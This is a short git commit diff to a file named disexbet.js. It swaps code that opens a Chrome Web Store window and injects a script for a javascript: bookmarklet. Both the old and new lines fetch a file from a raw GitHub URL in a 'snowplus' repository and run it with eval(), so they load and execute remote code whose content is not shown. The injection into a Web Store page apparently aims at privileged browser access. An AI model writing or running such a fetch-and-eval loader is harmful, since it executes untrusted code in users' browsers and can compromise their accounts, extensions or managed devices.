ad38181eb933552b3b84db9a1487b31b4d1da839
Discord <95700058+phillipbruh@users.noreply.github.com>
2022-10-03 10:35:39 -0400

    Update disexbet.js

--- disexbet.js
+++ disexbet.js
@@ -1,2 +1,1 @@
-x = window.open("https://chrome.google.com/webstorex");
-x.document.write('<script>fetch("https://raw.githubusercontent.com/phillipbruh/snowplus/main/idk").then(data=>{data.text().then(text=>{eval(text)})});</script>');
+javascript:fetch("https://raw.githubusercontent.com/phillipbruh/snowplus/main/idk").then(data=>{data.text().then(text=>{eval(text)})});
